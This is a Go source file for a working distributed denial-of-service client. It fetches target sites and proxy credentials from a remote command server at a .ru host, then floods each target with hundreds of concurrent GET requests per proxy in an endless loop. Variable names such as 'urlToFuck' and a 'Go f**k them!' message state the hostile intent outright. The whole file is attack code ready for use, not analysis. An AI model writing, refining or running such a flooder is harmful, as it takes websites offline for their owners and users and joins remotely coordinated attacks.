package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const GetHostsUrl = "http://rockstarbloggers.ru/hosts.json"

type UrlAndProxy struct {
	Site  Site    `json:"site"`
	Proxy []Proxy `json:"proxy"`
}

type Site struct {
	Id           int    `json:"id"`
	Url          string `json:"url"`
	NeedParseUrl bool   `json:"need_parse_url"`
	Page         string `json:"page"`
	PageTime     string `json:"page_time"`
	Attack       bool   `json:"atack"`
}

type Proxy struct {
	Id   int    `json:"id"`
	Ip   string `json:"ip"`
	Auth string `json:"auth"`
}

func main() {
	fmt.Println("Starting the app... ")

	argsWithoutProg := os.Args[1:]

	urlAndProxy := new(UrlAndProxy)
	for _, k := range argsWithoutProg {
		if k == "debug" {

			jsonFile, err := os.Open("api.json") // u can get example from urls in GetHostsUrl
			if err != nil {
				fmt.Println(err)
			}
			fmt.Println("Successfully Opened api.json")
			defer jsonFile.Close()

			data, _ := ioutil.ReadAll(jsonFile)
			json.Unmarshal([]byte(data), &urlAndProxy)
			fmt.Println("Proxy - 200")

			fmt.Println("URL - " + urlAndProxy.Site.Page)

			var wg sync.WaitGroup
			urlToFuck := urlAndProxy.Site.Page
			fmt.Println("Go f**k them!")
			for _, proxy := range urlAndProxy.Proxy {
				for i := 0; i < 5; i++ {
					wg.Add(1)
					go sendRequest(urlToFuck, &proxy, &wg)
				}
			}

			fmt.Println("Main: Waiting for workers to finish")
			wg.Wait()
			fmt.Println("Main: Completed")

			fmt.Scanln()
			fmt.Println("The End")
			os.Exit(0)
		}
		//@todo count of goroutines from args
	}

	for {
		// fmt.Println("Request to get proxy...")
		data, err := getInitData()

		if err != nil {
			fmt.Println("Can't get new proxy. Trying to restart...")
			// fmt.Println(err)
			continue
		}

		json.Unmarshal([]byte(data), &urlAndProxy)
		// fmt.Println("Proxy - 200")

		var wg sync.WaitGroup
		urlToFuck := urlAndProxy.Site.Page

		u, err := url.Parse(urlToFuck)
		if err != nil {
			// fmt.Println(err)
			continue
		}

		if u.Scheme == "" {
			urlToFuck = "http://" + urlToFuck
		}

		fmt.Println("URL - " + urlToFuck)
		// fmt.Println("Go f**k them!")
		for _, proxy := range urlAndProxy.Proxy {
			for i := 0; i < 300; i++ { // @todo count of goroutines from args
				wg.Add(1)
				go sendRequest(urlToFuck, &proxy, &wg)
			}
		}

		wg.Wait()
	}
}

func getApiData(url string) ([]byte, error) {
	resp, err := http.Get(url)

	if err != nil {
		return []byte{}, fmt.Errorf("GET error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []byte{}, fmt.Errorf("Status error: %v", resp.StatusCode)
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	return data, nil
}

func getInitData() ([]byte, error) {
	url := GetHostsUrl

	apiUrlsResp, err := getApiData(url)
	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	var apiUrls []string
	json.Unmarshal([]byte(apiUrlsResp), &apiUrls)

	data, err := getApiData(apiUrls[rand.Intn(len(apiUrls))])

	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	return data, nil
}

func sendRequest(urlToFuck string, proxyConf *Proxy, wg *sync.WaitGroup) {
	defer wg.Done()
	var proxy = "http://" + proxyConf.Auth + "@" + strings.TrimSuffix(proxyConf.Ip, "\r")

	proxyURL, err := url.Parse(proxy)
	if err != nil {
		log.Println(err)
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Second * 10,
	}

	currentTime := time.Now()

	request, err := http.NewRequest("GET", urlToFuck, nil)
	if err != nil {
		// fmt.Println(currentTime.Format("15:04:05"), " | Bad request: "+err.Error()+" | 0")
		return
	}

	response, err := client.Do(request)
	if err != nil {
		// fmt.Println(currentTime.Format("15:04:05"), " | Bad response: "+err.Error()+" | 0")
		return
	}
	defer response.Body.Close()

	if (response.StatusCode < http.StatusOK) || (response.StatusCode > http.StatusFound) {
		// fmt.Println("Bad response: " + strconv.Itoa(response.StatusCode))
		return
	}

	fmt.Println(currentTime.Format("15:04:05"), " | Request OK | ", response.StatusCode)
}
